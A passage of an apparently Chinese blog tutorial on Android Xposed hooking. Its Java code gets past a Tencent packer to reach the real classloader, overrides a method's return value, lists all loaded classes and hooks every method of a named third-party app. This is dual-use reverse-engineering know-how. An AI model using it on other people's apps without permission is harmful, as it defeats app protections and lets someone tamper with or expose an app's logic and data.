class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">               XposedHelpers.findAndHookMethod(<span class="hljs-string">&quot;com.tencent.StubShell.TxAppEntry&quot;</span>, loadPackageParam.classLoader,<br>                    <span class="hljs-string">&quot;attachBaseContext&quot;</span>, Context.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                        <span class="hljs-meta">@Override</span><br>                        <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                            <span class="hljs-keyword">super</span>.afterHookedMethod(param);<br>                            <span class="hljs-comment">//获取到Context对象，通过这个对象来获取classloader</span><br>                            Context context = (Context) param.args[<span class="hljs-number">0</span>];<br>                            <span class="hljs-comment">//获取classloader，之后hook加固后的就使用这个classloader</span><br>                            ClassLoader classLoader =context.getClassLoader();<br>                            <span class="hljs-comment">//下面就是强classloader修改成壳的classloader就可以成功的hook了</span><br>                            XposedHelpers.findAndHookMethod(<span class="hljs-string">&quot;xxx.xxx.xxx.xxx&quot;</span>, classLoader, <span class="hljs-string">&quot;xxx&quot;</span>, String.class, String.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                                <span class="hljs-meta">@Override</span><br>                                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                                    <span class="hljs-keyword">super</span>.beforeHookedMethod(param);<br>                                    LogUtils.log( <span class="hljs-string">&quot;key： &quot;</span> + (String) param.args[<span class="hljs-number">0</span>]);<br>                                    LogUtils.log( <span class="hljs-string">&quot;value： &quot;</span> + (String) param.args[<span class="hljs-number">1</span>]);<br>                                    param.setResult((String) param.args[<span class="hljs-number">1</span>]);<br>                                &#125;<br>                            &#125;);<br>                       <br>        &#125;<br> <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-获取所有类"><a href="#3-获取所有类" class="headerlink" title="3. 获取所有类"></a>3. 获取所有类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequiresApi(api = Build.VERSION_CODES.KITKAT)</span><br><span class="hljs-keyword">public</span> String[] getClass(ClassLoader classLoader)&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> j;<br>    <span class="hljs-keyword">int</span> k;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-comment">//取得PathClassLoader的pathList的属性</span><br>        Field pathList = classLoader.getClass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;pathList&quot;</span>);<br>        pathList.setAccessible(<span class="hljs-keyword">true</span>);<br>      <span class="hljs-comment">// 取得PathClassLoader的pathList的属性真实值（得到一个DexPathList对象）</span><br>        Object dexPathListObj=pathList.get(classLoader);<br>      <span class="hljs-comment">//获得DexPathList中的dexElements 属性</span><br>        Field dexElementsField =         dexPathListObj.getClass().getDeclaredField(<span class="hljs-string">&quot;dexElements&quot;</span>);<br>        dexElementsField.setAccessible(<span class="hljs-keyword">true</span>);<br>      <span class="hljs-comment">// 获得DexPathList对象中dexElements 属性的真实值</span><br>        Object dexElements_objs=dexElementsField.get(dexPathListObj);<br><br>            <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;Array.getLength(dexElements_objs);i++)&#123;<br>                Object dexElements_obj=Array.get(dexElements_objs,i);<br>   Field dexfileField =dexElements_obj.getClass().getDeclaredField(<span class="hljs-string">&quot;dexFile&quot;</span>);<br>                dexfileField.setAccessible(<span class="hljs-keyword">true</span>);<br>                Object clz=dexfileField.get(dexElements_obj);<br>                Method[] methods=clz.getClass().getDeclaredMethods();<br>                <span class="hljs-keyword">for</span> (j=<span class="hljs-number">0</span>;j&lt;methods.length;j++)&#123;<br>                    Method method=methods[j];<br>                    <span class="hljs-keyword">if</span> (method.getName().equalsIgnoreCase(<span class="hljs-string">&quot;getClassNameList&quot;</span>))&#123;<br>                        method.setAccessible(<span class="hljs-keyword">true</span>);<br>                        Field mCookieField = clz.getClass().getDeclaredField(<span class="hljs-string">&quot;mCookie&quot;</span>);<br>                        mCookieField.setAccessible(<span class="hljs-keyword">true</span>);<br>                        Object classoes_bj=method.invoke(clz,mCookieField.get(clz));<br>                        <span class="hljs-keyword">int</span> classes_len=Array.getLength(classoes_bj);<br>                        String[] classes=<span class="hljs-keyword">new</span> String[classes_len];<br>                        <span class="hljs-keyword">for</span> (k=<span class="hljs-number">0</span>;k&lt;classes_len;k++)&#123;<br>                            classes[k]= (String) Array.get(classoes_bj,k);<br>                        &#125;<br>                       <span class="hljs-keyword">return</span> classes;<br>                    &#125;<br>                &#125;<br>            &#125;<br> &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException | InvocationTargetException e) &#123;<br>        e.printStackTrace();<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> String[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-Hook所有方法"><a href="#4-Hook所有方法" class="headerlink" title="4. Hook所有方法"></a>4. Hook所有方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.xposed.enumeratorClassHook;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;<br><span class="hljs-keyword">import</span> de.robv.android.xposed.XC_MethodHook;<br><span class="hljs-keyword">import</span> de.robv.android.xposed.XC_MethodHook.MethodHookParam;<br><span class="hljs-keyword">import</span> de.robv.android.xposed.XposedBridge;<br><span class="hljs-keyword">import</span> de.robv.android.xposed.XposedHelpers;<br><span class="hljs-keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;<br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;<br><br><span class="hljs-comment">// 自定义的回调函数接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Module</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">IXposedHookLoadPackage</span> </span>&#123;<br><br>    <span class="hljs-keyword">static</span> String strClassName = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handleLoadPackage</span><span class="hljs-params">(LoadPackageParam lpparam)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br><br>        <span class="hljs-comment">// 被Hook操作的目标Android应用的包名，进行Hook操作的过滤</span><br>        String strPackageName = <span class="hljs-string">&quot;com.guji.loveparty&quot;</span>;<br>        <span class="hljs-keyword">if</span> (lpparam.packageName.equals(strPackageName)) &#123;<br><br>            XposedBridge.log(<span class="hljs-string">&quot;Loaded App:&quot;</span> + lpparam.packageName);<br>  findAndHookMethod(ClassLoader.class, <span class="hljs-string">&quot;loadClass&quot;</span>, String.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br><br>                <span class="hljs-comment">// 在类方法loadClass执行之后执行的代码</span><br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br><br>                    <span class="hljs-comment">// 参数的检查</span><br>                    <span class="hljs-keyword">if</span> (param.hasThrowable()) &#123;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br><br>                    <span class="hljs-comment">// 获取指定名称的类加载之后的Class&lt;?&gt;</span><br>                    Class&lt;?&gt; clazz = (Class&lt;?&gt;) param.getResult();<br>                    <span class="hljs-comment">// 获取加载的指定类的名称</span><br>                    String strClazz = clazz.getName();<br>                    XposedBridge.log(<span class="hljs-string">&quot;LoadClass : &quot;</span>+strClazz);<br>                    <span class="hljs-comment">// 所有的类都是通过loadClass方法加载的</span><br>                    <span class="hljs-comment">// 过滤掉Android系统的类以及一些常见的java类库</span><br>                    <span class="hljs-keyword">if</span> (!strClazz.startsWith(<span class="hljs-string">&quot;android.&quot;</span>) <br>                        &amp;&amp; !strClazz.startsWith(<span class="hljs-string">&quot;.system&quot;</span>)<br>                        &amp;&amp; !strClazz.startsWith(<span class="hljs-string">&quot;java.&quot;</span>) <br>                        &amp;&amp; !strClazz.startsWith(<span class="hljs-string">&quot;org.&quot;</span>) <br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;umeng.&quot;</span>)<br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;com.google&quot;</span>)<br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;.alipay&quot;</span>)<br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;.netease&quot;</span>)<br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;.alibaba&quot;</span>)<br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;.pgyersdk&quot;</span>)<br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;.daohen&quot;</span>)<br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;.bugly&quot;</span>)<br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;mini&quot;</span>)<br>                        &amp;&amp; !strClazz.contains(<span class="hljs-string">&quot;xposed&quot;</span>)) &#123;<br>                        <span class="hljs-comment">// 或者只Hook加密算法类、网络数据传输类、按钮事件类等协议分析的重要类</span><br><br>                        <span class="hljs-comment">// 同步处理一下</span><br>                        <span class="hljs-keyword">synchronized</span> (<span class="hljs-keyword">this</span>.getClass()) &#123;<br><br>                            <span class="hljs-comment">// 获取被Hook的目标类的名称</span><br>                            strClassName = strClazz;<br>                            <span class="hljs-comment">//XposedBridge.log(&quot;HookedClass : &quot;+strClazz);</span><br>                            <span class="hljs-comment">// 获取到指定名称类声明的所有方法的信息</span><br>                            Method[] m = clazz.getDeclaredMethods();<br>                            <span class="hljs-comment">// 打印获取到的所有的类方法的信息</span><br>                            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m.length; i++) &#123;<br><br>  <span class="hljs-comment">// 过滤掉指定名称类中声明的抽象方法</span><br>                                <span class="hljs-keyword">if</span> (!Modifier.isAbstract(m[i].getModifiers())  <br>                                    <span class="hljs-comment">// 过滤掉指定名称类中声明的Native方法</span><br>                                     &amp;&amp; !Modifier.isNative(m[i].getModifiers())  <br>                                    <span class="hljs-comment">// 过滤掉指定名称类中声明的接口方法</span><br>                                     &amp;&amp; !Modifier.isInterface(m[i].getModifiers())  <br>                                     ) &#123;<br><br>                                    <span class="hljs-comment">// 对指定名称类中声明的非抽象方法进行java Hook处理</span><br>                                    XposedBridge.hookMethod(m[i], <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br><br>                                        <span class="hljs-comment">// 被java Hook的类方法执行完毕之后，打印log日志</span><br>                                        <span class="hljs-meta">@Override</span><br>              <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br><br>                                            <span class="hljs-comment">// 打印被java Hook的类方法的名称和参数类型等信息</span><br> XposedBridge.log(<span class="hljs-string">&quot;HOOKED METHOD: &quot;</span>+strClassName+<span class="hljs-string">&quot;-&quot;</span>+param.method.toString());<br>                                        &#125;<br>                                    &#125;);<br>                                &#125;<br>                            &#125;<br>                        &#125;<br><br>                    &#125;<br>                &#125;<br>            &#125;);<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-comment">// 获取指定名称的类声明的类成员变量、类方法、内部类的信息</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">dumpClass</span><span class="hljs-params">(Class&lt;?&gt; actions)</span> </span>&#123;<br><br>        XposedBridge.log(<span class="hljs-string">&quot;Dump class &quot;</span> + actions.getName());<br>        XposedBridge.log(<span class="hljs-string">&quot;Methods&quot;</span>);<br><br>        <span class="hljs-comment">// 获取到指定名称类声明的所有方法的信息</span><br>        Method[] m = actions.getDeclaredMethods();<br>        <span class="hljs-comment">// 打印获取到的所有的类方法的信息</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m.length; i++) &#123;<br><br>            XposedBridge.log(m[i].toString());<br>        &#125;<br><br>        XposedBridge.log(<span class="hljs-string">&quot;Fields&quot;</span>);<br>        <span class="hljs-comment">// 获取到指定名称类声明的所有变量的信息</span><br>        Field[] f = actions.getDeclaredFields();<br>        <span class="hljs-comment">// 打印获取到的所有变量的信息</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; f.length; j++) &#123;<br><br>            XposedBridge.log(f[j].toString());<br>        &#125;<br><br>        XposedBridge.log(<span class="hljs-string">&quot;Classes&quot;</span>);<br>        <span class="hljs-comment">// 获取到指定名称类中声明的所有内部类的信息</span><br>        Class&lt;?&gt;[] c = actions.getDeclaredClasses();<br>        <span class="hljs-comment">// 打印获取到的所有内部类的信息</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; c.length; k++) &#123;<br><br>            XposedBridge.log(c[k].toString());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5、XposedHook程序源码"><a href="#5、XposedHook程序源码" class="headerlink" title="5、XposedHook程序源码"></a>5、XposedHook程序源码</h2><p>HookDemo.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Animal</span></span>&#123;<br>    <span class="hljs-keyword">int</span> anonymoutInt = <span class="hljs-number">500</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">eatFunc</span><span class="hljs-params">(String value)</span></span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HookDemo</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String Tag = <span class="hljs-string">&quot;HookDemo&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">int</span> staticInt = <span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">int</span> publicInt = <span class="hljs-number">200</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> privateInt = <span class="hljs-number">300</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">HookDemo</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">this</span>(<span class="hljs-string">&quot;NOHook&quot;</span>);<br>        Log.d(Tag, <span class="hljs-string">&quot;HookDemo() was called|||&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">HookDemo</span><span class="hljs-params">(String str)</span></span>&#123;<br>        Log.d(Tag, <span class="hljs-string">&quot;HookDemo(String str) was called|||&quot;</span> + str);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hookDemoTest</span><span class="hljs-params">()</span></span>&#123;<br>        Log.d(Tag, <span class="hljs-string">&quot;staticInt = &quot;</span> + staticInt);<br>        Log.d(Tag, <span class="hljs-string">&quot;PublicInt = &quot;</span> + publicInt);<br>        Log.d(Tag, <span class="hljs-string">&quot;privateInt = &quot;</span> + privateInt);<br>        publicFunc(<span class="hljs-string">&quot;NOHook&quot;</span>);<br>        Log.d(Tag, <span class="hljs-string">&quot;PublicInt = &quot;</span> + publicInt);<br>        Log.d(Tag, <span class="hljs-string">&quot;privateInt = &quot;</span> + privateInt);<br>        privateFunc(<span class="hljs-string">&quot;NOHook&quot;</span>);<br>        staticPrivateFunc(<span class="hljs-string">&quot;NOHook&quot;</span>);<br><br>        String[][] str = <span class="hljs-keyword">new</span> String[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>];<br>        Map map = <span class="hljs-keyword">new</span> HashMap&lt;String, String&gt;();<br>        map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        ArrayList arrayList = <span class="hljs-keyword">new</span> ArrayList();<br>        arrayList.add(<span class="hljs-string">&quot;listValue&quot;</span>);<br>        complexParameterFunc(<span class="hljs-string">&quot;NOHook&quot;</span>, str, map, arrayList);<br><br>        repleaceFunc();<br>        anonymousInner(<span class="hljs-keyword">new</span> Animal() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">eatFunc</span><span class="hljs-params">(String value)</span> </span>&#123;<br>                Log.d(Tag, <span class="hljs-string">&quot;eatFunc(String value)  was called|||&quot;</span> + value);<br>                Log.d(Tag, <span class="hljs-string">&quot;anonymoutInt =  &quot;</span> + anonymoutInt);<br>            &#125;<br>        &#125;, <span class="hljs-string">&quot;NOHook&quot;</span>);<br><br>        InnerClass innerClass = <span class="hljs-keyword">new</span> InnerClass();<br>        innerClass.InnerFunc(<span class="hljs-string">&quot;NOHook&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">publicFunc</span><span class="hljs-params">(String value)</span></span>&#123;<br>        Log.d(Tag, <span class="hljs-string">&quot;publicFunc(String value) was called|||&quot;</span> + value);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">privateFunc</span><span class="hljs-params">(String value)</span></span>&#123;<br>        Log.d(Tag, <span class="hljs-string">&quot;privateFunc(String value) was called|||&quot;</span> + value);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">staticPrivateFunc</span><span class="hljs-params">(String value)</span></span>&#123;<br>        Log.d(<span class="hljs-string">&quot;HookDemo&quot;</span>, <span class="hljs-string">&quot;staticPrivateFunc(Strin value) was called|||&quot;</span> + value);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">complexParameterFunc</span><span class="hljs-params">(String value, String[][] str, Map&lt;String,String&gt; map, ArrayList arrayList)</span></span><br><span class="hljs-function">    </span>&#123;<br>        Log.d(<span class="hljs-string">&quot;HookDemo&quot;</span>, <span class="hljs-string">&quot;complexParameter(Strin value) was called|||&quot;</span> + value);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">repleaceFunc</span><span class="hljs-params">()</span></span>&#123;<br>        Log.d(Tag, <span class="hljs-string">&quot;repleaceFunc will be replace|||&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">anonymousInner</span><span class="hljs-params">(Animal dog, String value)</span></span>&#123;<br>        Log.d(Tag, <span class="hljs-string">&quot;anonymousInner was called|||&quot;</span> + value);<br>        dog.eatFunc(<span class="hljs-string">&quot;NOHook&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hideFunc</span><span class="hljs-params">(String value)</span></span>&#123;<br>        Log.d(Tag, <span class="hljs-string">&quot;hideFunc was called|||&quot;</span> + value);<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InnerClass</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> innerPublicInt = <span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> innerPrivateInt = <span class="hljs-number">20</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InnerClass</span><span class="hljs-params">()</span></span>&#123;<br>            Log.d(Tag, <span class="hljs-string">&quot;InnerClass constructed func was called&quot;</span>);<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">InnerFunc</span><span class="hljs-params">(String value)</span></span>&#123;<br>            Log.d(Tag, <span class="hljs-string">&quot;InnerFunc(String value) was called|||&quot;</span> + value);<br>            Log.d(Tag, <span class="hljs-string">&quot;innerPublicInt = &quot;</span> + innerPublicInt);<br>            Log.d(Tag, <span class="hljs-string">&quot;innerPrivateInt = &quot;</span> + innerPrivateInt);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span 